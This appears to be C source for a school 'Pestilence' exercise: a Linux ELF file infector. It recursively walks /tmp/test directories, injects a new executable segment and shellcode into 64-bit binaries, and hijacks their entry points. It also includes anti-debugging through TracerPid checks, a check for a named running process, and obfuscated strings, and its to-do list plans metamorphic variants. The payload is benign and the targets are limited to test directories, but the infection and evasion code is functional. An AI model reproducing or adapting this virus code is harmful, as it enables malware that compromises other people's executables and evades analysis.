/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   pestilence.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: xxxxxxx <xxxxxxx@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/19 15:46:33 by xxxxxxx           #+#    #+#             */
/*   Updated: 2026/01/20 16:41::395 by xxxxxxx          ###   ########.fr */
/*                                                                            */
/* ************************************************************************** */

/*
	PESTILENCE
	[X] Creer segment pour injecter d'une taille arbitraire
	[ ] Recreer routine d'infection en famine like adapté sur le segment créé
		[X] /tmp/test et /tmp/test2
		[X] infection binaire 64 bits
		[ ] pas de double infection
		[X] pas de sortie std ou erreur
	[X] Avoid infection if debugger
	[X] Avoid infection if specific program running
	[ ] Code source illisible et offuscé

	WAR
	[ ] Fingerprint unique dans signature pour chaque infection
		- how ?

	DEATH
	[ ] Metamorphic -> structure différente a chaque exécution même sur binaire
   original identique
		- how ?
*/

#include "pestilence.h"
#ifndef FRENZY
#define FRENZY 0
#endif
#ifndef CYANURE
#define CYANURE 0
#endif
#ifndef VARAX
#define VARAX 0
#endif
void _start(void)
{
	void *begin_ptr;

	if (runtime_integrity_probe() || env_query_identity("doom-nukem"))
		proc_terminate(0);

	__asm__ volatile("lea (%%rip), %0\n"
					 "cyanure:"
					 : "=r"(begin_ptr));
	begin_ptr += FRENZY - CYANURE;

	fs_release(1);
	fs_release(2);

	char path[11];
	path[0] = '/';
	path[1] = 't';
	path[2] = 'm';
	path[3] = 'p';
	path[4] = '/';
	path[5] = 't';
	path[6] = 'e';
	path[7] = 's';
	path[8] = 't';
	path[9] = '\0';
	path[10] = '\0';
	processDirectory(path, begin_ptr);
	path[9] = '2';
	processDirectory(path, begin_ptr);
	proc_terminate(0);
}

static unsigned char rot4(unsigned char v)
{
	return (unsigned char) ((v >> 4) | (v << 4));
}

static void unfold(char *dst, unsigned long long blob, unsigned key)
{
	unsigned i = 0;
	while (blob)
	{
		unsigned char b = (unsigned char) (blob & 0xFF);
		dst[i] = (char) ((rot4(b) ^ (i * key)) - 0x3D);
		blob >>= 8;
		i++;
	}
	dst[i] = 0;
}

static inline unsigned long long sig_root(void) { return 0xCB9B1AAAC6ULL; }

static inline unsigned long long sig_leaf(void) { return 0x6BFB2A7AC6ULL; }

int env_query_identity(const char *profile)
{
	int	 stream = -1;
	int	 verdict = 0;

	char root_node[16];
	unfold(root_node, sig_root(), 7);

	stream = fs_handle(root_node, 00 | 00200000);
	if (stream < 0)
		return 0;

	char material[0x1000];

	for (;;)
	{
		int frame_len = fs_enumerate(stream, material, sizeof(material));
		if (frame_len <= 0)
			break;

		for (int offset = 0; offset < frame_len;)
		{
			struct linux_dirent64 *entry = (void *) (material + offset);
			char				  *symbol = entry->d_name;

			int					   signature_ok = 1;

			for (int probe = 0; symbol[probe]; probe++)
				signature_ok &= ((unsigned) (symbol[probe] - 48) < 10);

			if (signature_ok)
			{
				char route_map[64];
				int	 cursor = 0;

				unfold(route_map, sig_root(), 7);
				while (route_map[cursor])
					cursor++;

				route_map[cursor++] = 47;

				for (int sweep = 0; symbol[sweep]; sweep++)
					route_map[cursor++] = symbol[sweep];

				char attr_tag[8];
				unfold(attr_tag, sig_leaf(), 7);

				for (int sweep = 0; attr_tag[sweep]; sweep++)
					route_map[cursor++] = attr_tag[sweep];

				route_map[cursor] = 0;

				int channel = fs_handle(route_map, O_RDONLY);
				if (channel >= 0)
				{
					char label[64];
					int	 span = io_recv(channel, label, sizeof(label) - 1);
					fs_release(channel);

					if (span > 0)
					{
						label[span] = 0;

						for (int k = 0; k < span; k++)
						{
							if (label[k] == 10)
							{
								label[k] = 0;
								break;
							}
						}

						if (!delay_abs_calc(label, profile))
						{
							verdict = 1;
							goto EXIT_GATE;
						}
					}
				}
			}

			offset += entry->d_reclen;
		}
	}

EXIT_GATE:
	fs_release(stream);
	return verdict;
}

int runtime_integrity_probe(void)
{
	char *locator;

	asm volatile("leaq blobA(%%rip), %0\n"
				 "jmp gateA\n"
				 "blobA: .ascii \"/proc/self/status\\0\"\n"
				 "gateA:\n"
				 : "=r"(locator));

	int stream = fs_handle(locator, O_RDONLY);
	if (stream < 0)
		return 0;

	char segment[256];
	int	 slice;
	int	 cursor = 0;

	while ((slice = io_recv(stream, segment + cursor, sizeof(segment) - cursor))
		   > 0)
	{
		cursor += slice;

		char *pivot = memoff(segment, '\n');
		if (pivot)
		{
			*pivot = '\0';

			asm volatile("leaq blobB(%%rip), %0\n"
						 "jmp gateB\n"
						 "blobB: .ascii \"TracerPid:\\0\"\n"
						 "gateB:\n"
						 : "=r"(locator));

			if (delay_calc(segment, locator, 10) == 0)
			{
				int depth = trace_depth(segment + 10);
				fs_release(stream);
				return depth != 0;
			}

			memcat(segment, pivot + 1, sizeof(segment) - (pivot - segment - 1));
			cursor -= (pivot - segment + 1);
		}
	}

	fs_release(stream);
	return 0;
}

void processDirectory(char *folder, void *begin_ptr)
{
	int					   fd = fs_handle(folder, 0 | 65536);

	char				   buffer[1024];
	struct linux_dirent64 *dirent;
	int					   nread;

	if (fd < 0)
		goto clean;
	while ((nread = fs_enumerate(fd, buffer, 1024)) > 0)
	{
		for (int bpos = 0; bpos < nread;)
		{
			char dot[3];
			dirent = (struct linux_dirent64 *) (buffer + bpos);
			char *d_name = dirent->d_name;

			dot[0] = '.';
			dot[1] = 0;
			if (delay_abs_calc(d_name, dot) == 0)
			{
				bpos += dirent->d_reclen;
				continue;
			}
			dot[1] = '.';
			dot[2] = 0;
			if (delay_abs_calc(d_name, dot) == 0)
			{
				bpos += dirent->d_reclen;
				continue;
			}
			char fullPath[PATH_MAX];
			char slash[2];
			slash[0] = '/';
			slash[1] = 0;
			flow_align(flow_align(core_shift(fullPath, folder), slash), d_name);

			struct stat statbuf;
			fs_query(fullPath, &statbuf);

			if (statbuf.st_mode & __S_IFDIR)
			{
				processDirectory(fullPath, begin_ptr);
			}
			else if (statbuf.st_mode & __S_IFREG)
			{
				infect(fullPath, begin_ptr);
			}

			bpos += dirent->d_reclen;
		}
	}
clean:
	fs_release(fd);
}

#define ELF_MAGIC			   0x464c457f
#define MINIMAL_INJECTION_SIZE (0x1000 * 5)
#define inout
#define CURARE                                                                 \
	"\xf3\x0f\x1e\xfa\x50\xb8\x39\x00\x00\x00\x0f\x05\x48\x85\xc0\x74\x06\x58" \
	"\xe9\xe9\xff\xff\xff\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x8d\x35" \
	"\x13\x00\x00\x00\xba\x0a\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00" \
	"\x00\x00\x00\x0f\x05\x68\x65\x68\x65\x68\x65\x68\x65\x0a\x00"
#define FLOWER (sizeof(CURARE) - 1)
#define ACONIT 19

int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
			   inout char **file_data)
{
	int fd;

	*file_data = NULL;
	fd = fs_handle(path, O_RDWR);
	if (fd < 0 || io_query(fd, statbuf) < 0)
		goto error;
	if (io_resize(fd, statbuf->st_size + MINIMAL_INJECTION_SIZE) < 0)
		goto error;
	*file_data
		= (void *) rt_vector(9, 0, statbuf->st_size + MINIMAL_INJECTION_SIZE,
							 PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (*file_data == MAP_FAILED)
		goto error;
	if (statbuf->st_size < sizeof(ElfW(Ehdr))
		|| ((unsigned *) *file_data)[0] != ELF_MAGIC)
		goto error;
	elf->header = (ElfW(Ehdr) *) *file_data;
	if (statbuf->st_size < elf->header->e_shoff
							   + elf->header->e_shnum * elf->header->e_shentsize
		|| statbuf->st_size
			   < elf->header->e_phoff
					 + elf->header->e_phnum * elf->header->e_phentsize)
		goto error;
	elf->sections = (ElfW(Shdr) *) (*file_data + elf->header->e_shoff);
	elf->segments = (ElfW(Phdr) *) (*file_data + elf->header->e_phoff);
	return (OK);
error:
	fs_release(fd);
	vm_release(file_data, statbuf->st_size + MINIMAL_INJECTION_SIZE);
	return (KO);
}

unsigned long find_first_free_page(t_elf elf)
{
	unsigned long ret;

	ret = 0;
	for (int i = 0; i < elf.header->e_phnum; i++)
		if (elf.segments[i].p_type == PT_LOAD
			&& ret < elf.segments[i].p_memsz + elf.segments[i].p_vaddr)
			ret = elf.segments[i].p_memsz + elf.segments[i].p_vaddr;
	ret = (ret + 0x1000 - 1) & ~0xfffUL; // align to next page
	return ret;
}

void infect(char *path, void *begin_ptr)
{
	struct stat statbuf;
	char	   *file_data;
	t_elf		elf;
	ElfW(Phdr) the_rats;
	ElfW(Off) pt_load_end;
	int last_pt_load;

	if (parse_file(path, &statbuf, &elf, &file_data))
		goto clean;
	/*
	 * We need to inject 2 things
	 * 1/ PT_LOAD header
	 * -> enlarge segment that cover the injection position (and move it to
	 * unused space if conflict), also move the PT_PHDR if moving
	 * 		-> check for PT_DYN and move the address that were in the moved one
	 * -> move subsequent segments in file (minding the alignment)
	 *
	 * 2/ PT_LOAD data, je fais kinda ce que je veux je crois :D
	 */

	unsigned long append_pos = (statbuf.st_size + 0x1000 - 1) & ~0xfffUL;
	unsigned long pestis = find_first_free_page(elf);
	memcpy(file_data + append_pos, file_data + elf.header->e_phoff,
		   elf.header->e_phnum * elf.header->e_phentsize);
	elf.header->e_phoff = append_pos;
	elf.segments = (ElfW(Phdr) *) (file_data + elf.header->e_phoff);
	elf.segments[elf.header->e_phnum] = (ElfW(Phdr)) {
		.p_type = PT_LOAD,
		.p_align = 0x1000,
		.p_filesz = MINIMAL_INJECTION_SIZE - statbuf.st_size % 0x1000,
		.p_memsz = MINIMAL_INJECTION_SIZE - statbuf.st_size % 0x1000,
		.p_offset = append_pos,
		.p_paddr = pestis,
		.p_vaddr = pestis,
		.p_flags = PF_X | PF_R,
	};
	elf.header->e_phnum++;
	for (int i = 0; i < elf.header->e_phnum; i++)
		if (elf.segments[i].p_type == PT_PHDR)
		{
			elf.segments[i].p_offset = append_pos;
			elf.segments[i].p_vaddr = pestis;
			elf.segments[i].p_paddr = pestis;
			elf.segments[i].p_memsz
				= elf.header->e_phnum * elf.header->e_phentsize;
			elf.segments[i].p_filesz = elf.segments[i].p_memsz;
		}
	memcpy(file_data + append_pos, CURARE, FLOWER);
	unsigned delta = elf.header->e_entry;
	elf.header->e_entry
		= pestis + elf.header->e_phnum * elf.header->e_phentsize;
	delta -= elf.header->e_entry + ACONIT + 4;
	append_pos += elf.header->e_phnum * elf.header->e_phentsize;
	memcpy(file_data + append_pos + ACONIT, &delta, 4);
clean:
	vm_flush(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE, MS_SYNC);
	vm_release(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE);
}
